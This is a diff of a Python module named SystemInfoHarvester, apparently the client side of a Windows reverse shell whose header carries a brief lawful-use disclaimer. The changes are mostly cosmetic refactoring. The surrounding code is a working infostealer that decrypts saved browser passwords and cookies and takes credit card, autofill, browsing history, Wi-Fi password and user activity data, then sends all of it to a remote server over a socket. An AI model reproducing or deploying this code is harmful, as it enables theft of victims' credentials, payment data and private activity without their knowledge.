@@ -1,47 +1,49 @@
-import platform
-from getmac import get_mac_address as gma
-import requests
-import subprocess
+#Created by Vasto Boy
+
+#Disclaimer: This reverse shell should only be used in the lawful, remote administration of authorized systems. Accessing a computer network without authorization or permission is illegal.
+
 import re
 import os
-import winreg
-from win32api import GetSystemMetrics
 import json
-import base64
-import sqlite3
-import win32crypt
-from Crypto.Cipher import AES
 import shutil
 import psutil
 import struct
+import winreg
+import base64
+import sqlite3
 import getpass
-from datetime import timedelta
 import datetime
-
+import platform
+import requests
+import subprocess
+import win32crypt
+from Crypto.Cipher import AES
+from datetime import timedelta
+from win32api import GetSystemMetrics
+from getmac import get_mac_address as gma
 
 
 class SystemInfoHarvester:
 
-        #returns client system information to the server
+        # returns client system information to the server
         def get_platform_info(self, conn):
-            sys_info = []
+            sys_info = {
+                "mac-address": gma(),
+                "os": platform.uname().system,
+                "node-name": platform.uname().node,
+                "release": platform.uname().release,
+                "version": platform.uname().version,
+                "machine": platform.uname().machine,
+                "date-joined": str(datetime.date.today()),
+                "time-joined": str(datetime.datetime.now().time()),
+                "user": getpass.getuser()
+            }
 
-            sys_info.append(gma())
-            sys_info.extend([platform.uname().system,
-                             platform.uname().node,
-                             platform.uname().release,
-                             platform.uname().version,
-                             platform.uname().machine,
-                             str(datetime.date.today()),
-                             str(datetime.datetime.now().time())
-                             ])
-            sys_info.append(getpass.getuser())
-
-            sys_info = " ".join(sys_info)
-            conn.send(sys_info.encode())
+            system_info_string = json.dumps(sys_info)
+            conn.send(system_info_string.encode())
 
 
-        #extracts scree width and height and sends back to server
+        # extracts scree width and height and sends back to server
         def extract_other_info(self, conn):
             result = []
 
@@ -62,7 +64,6 @@ class SystemInfoHarvester:
             otherData = json.dumps(result)
             otherData = struct.pack('>I', len(otherData)) + otherData.encode()
             conn.sendall(otherData)
-
 
 
         # gets all know Wi-Fi password on machine and sends back to server
@@ -120,7 +121,6 @@ class SystemInfoHarvester:
                                       0, winreg.KEY_READ | flag)
 
                 count_subkey = winreg.QueryInfoKey(aKey)[0]
-
                 for i in range(count_subkey):
                     software = {}
                     try:
@@ -142,7 +142,7 @@ class SystemInfoHarvester:
                 return software_list
 
             except Exception as e:
-                software_list.append(e)
+                software_list.append(str(e))
                 return software_list
 
 
@@ -162,21 +162,18 @@ class SystemInfoHarvester:
                 conn.sendall(installedApps)
 
             except Exception as e:
-                result.append({"Error": e})
+                result.append({"Error": str(e)})
                 installedApps = json.dumps(result)
                 installedApps = struct.pack('>I', len(installedApps)) + installedApps.encode()
                 conn.sendall(installedApps)
 
-
-
         #============================Browsing Data Extraction====================================
-        #delete copied database
+        # delete copied database
         def delete_browser_db(self, filename):
             try:
                 os.remove(filename)
             except:
                 pass
-
 
 
         # converts Chrome timestamp to date and time
@@ -207,7 +204,7 @@ class SystemInfoHarvester:
             return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
 
 
-        #decrypts data passed in with encryption key
+        # decrypts data passed in with encryption key
         def decrypt_data(self, data, key):
             try:
                 iv = data[3:15]
@@ -222,7 +219,7 @@ class SystemInfoHarvester:
                     return ""
 
 
-        #extracts saved password from browser and sends back to server
+        # extracts saved password from browser and sends back to server
         def get_browser_passwords(self, conn):
             result = []
 
@@ -239,7 +236,7 @@ class SystemInfoHarvester:
 
                 db = sqlite3.connect(filename)
                 cursor = db.cursor()
-                # `logins` table has the data we need
+
                 cursor.execute(
                     "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
 
@@ -251,7 +248,7 @@ class SystemInfoHarvester:
                     date_created = row[4]
                     date_last_used = row[5]
 
-                    #check if username or password is present
+                    # check if username or password is present
                     if username or password:
                         date_created = str(self.convert_chrome_datetime(date_created))
                         date_last_used = str(self.convert_chrome_datetime(date_last_used))
@@ -276,12 +273,12 @@ class SystemInfoHarvester:
 
 
 
-        #extract browsing cookies from browser and sends back to server
+        # extract browsing cookies from browser and sends back to server
         def get_browser_cookies(self, conn):
             result = []
-
             try:
-                db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data",
+                db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
+                                       "BraveSoftware", "Brave-Browser", "User Data",
                                        "Default", "Network", "Cookies")
                 filename = "cookies.db"
                 if not os.path.isfile(filename):
@@ -290,8 +287,7 @@ class SystemInfoHarvester:
                 db = sqlite3.connect(filename)
                 db.text_factory = lambda b: b.decode(errors="ignore")
                 cursor = db.cursor()
-                cursor.execute(
-                    """SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value FROM cookies""")
+                cursor.execute("""SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value FROM cookies""")
 
                 key = self.get_encryption_key()
                 for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in cursor.fetchall():
@@ -305,22 +301,20 @@ class SystemInfoHarvester:
                                    'Last access datetime (UTC)': str(self.convert_chrome_datetime(last_access_utc)),
                                    'Expires datetime (UTC)':str(self.convert_chrome_datetime(expires_utc))})
 
-                # close connection
-                db.close()
+                db.close() # close connection
                 self.delete_browser_db(filename)
-
                 cookieData =  json.dumps(result)
                 cookieData = struct.pack('>I', len(cookieData)) + cookieData.encode()
                 conn.sendall(cookieData)
 
             except Exception as e:
-                result.append({"Error": e})
+                result.append({"Error": str(e)})
                 cookieData = json.dumps(result)
                 cookieData = struct.pack('>I', len(cookieData)) + cookieData.encode()
                 conn.sendall(cookieData)
 
 
-        #extract browsing history from browser and sends back to server
+        # extract browsing history from browser and sends back to server
         def retrieve_browser_history(self, conn):
             result = []
 
@@ -352,19 +346,18 @@ class SystemInfoHarvester:
 
                 db.close()
                 self.delete_browser_db(filename)
-
                 browserHistoryData = json.dumps(result)
                 browserHistoryData = struct.pack('>I', len(browserHistoryData)) + browserHistoryData.encode()
                 conn.sendall(browserHistoryData)
 
             except Exception as e:
-                result.append({"Error": e})
+                result.append({"Error": str(e)})
                 browserHistoryData = json.dumps(result)
                 browserHistoryData = struct.pack('>I', len(browserHistoryData)) + browserHistoryData.encode()
                 conn.sendall(browserHistoryData)
 
 
-        #extracts credit card info from browser and sends back to server
+        # extracts credit card info from browser and sends back to server
         def retrieve_creditcard_info(self, conn):
             result = []
 
@@ -400,14 +393,14 @@ class SystemInfoHarvester:
                 conn.sendall(creditCardData)
 
             except Exception as e:
-                result.append({"Error": e})
+                result.append({"Error": str(e)})
                 creditCardData = json.dumps(result)
                 creditCardData = struct.pack('>I', len(creditCardData)) + creditCardData.encode()
                 conn.sendall(creditCardData)
 
 
 
-        #extracts autofill data from browser and sends back to server
+        # extracts autofill data from browser and sends back to server
         def retrieve_autofill_info(self, conn):
             result = []
 
@@ -437,7 +430,7 @@ class SystemInfoHarvester:
                 conn.sendall(autofillData)
 
             except Exception as e:
-                result.append({"Error": e})
+                result.append({"Error": str(e)})
                 autofillData = json.dumps(result)
                 autofillData = struct.pack('>I', len(autofillData)) + autofillData.encode()
                 conn.sendall(autofillData)
@@ -447,7 +440,7 @@ class SystemInfoHarvester:
 
 
         # ============================Network Information Extraction==============================
-        #extract memory data and sends back to server
+        # extract memory data and sends back to server
         def extract_memory_info(self, conn):
             result = []
 
@@ -460,13 +453,13 @@ class SystemInfoHarvester:
                 memoryInfoData = struct.pack('>I', len(memoryInfoData)) + memoryInfoData.encode()
                 conn.sendall(memoryInfoData)
             except Exception as e:
-                result.append({"Error": e})
+                result.append({"Error": str(e)})
                 memoryInfoData = json.dumps(result)
                 memoryInfoData = struct.pack('>I', len(memoryInfoData)) + memoryInfoData.encode()
                 conn.sendall(memoryInfoData)
 
 
-        #extract disk information and sends back to server
+        # extract disk information and sends back to server
         def extract_disk_info(self, conn):
             result = []
             try:
@@ -481,7 +474,7 @@ class SystemInfoHarvester:
                 conn.sendall(diskInfoData)
 
             except Exception as e:
-                result.append({"Error": e})
+                result.append({"Error": str(e)})
                 diskInfoData = json.dumps(result)
                 diskInfoData = struct.pack('>I', len(diskInfoData)) + diskInfoData.encode()
                 conn.sendall(diskInfoData)
@@ -510,7 +503,7 @@ class SystemInfoHarvester:
                 conn.sendall(networkInfoData)
 
             except Exception as e:
-                result.append({"Error": e})
+                result.append({"Error": str(e)})
                 networkInfoData = json.dumps(result)
                 networkInfoData = struct.pack('>I', len(networkInfoData)) + networkInfoData.encode()
                 conn.sendall(networkInfoData)
@@ -542,7 +535,7 @@ class SystemInfoHarvester:
                 conn.sendall(startupAppData)
 
             except Exception as e:
-                startup_programs.append({"Error": e})
+                startup_programs.append({"Error": str(e)})
                 networkInfoData = json.dumps(startup_programs)
                 networkInfoData = struct.pack('>I', len(networkInfoData)) + networkInfoData.encode()
                 conn.sendall(networkInfoData)
@@ -556,17 +549,15 @@ class SystemInfoHarvester:
 
 
 
-        #extracts user windows activity and send back to server
+        # extracts user windows activity and send back to server
         def get_user_activity(self, conn):
             activities = []
-
             try:
                 connectedDevicesPlatform_path = os.path.join(os.getenv('LOCALAPPDATA'), r'ConnectedDevicesPlatform')
                 user_sid_path = self.get_folder_name(connectedDevicesPlatform_path)
                 activitiesCache_path = os.path.join(os.getenv('LOCALAPPDATA'), r'ConnectedDevicesPlatform\{}'.format(user_sid_path),
                                                     'ActivitiesCache.db')
 
-                # Connect to the database
                 db_conn = sqlite3.connect(activitiesCache_path)
                 cursor = db_conn.cursor()
                 cursor.execute('SELECT * FROM Activity')
@@ -606,9 +597,8 @@ class SystemInfoHarvester:
                 conn.sendall(userActivityData)
 
             except Exception as e:
-                activities.append({"Error": e})
+                activities.append({"Error": str(e)})
                 userActivityData = json.dumps(activities)
                 userActivityData = struct.pack('>I', len(userActivityData)) + userActivityData.encode()
                 conn.sendall(userActivityData)
-
 
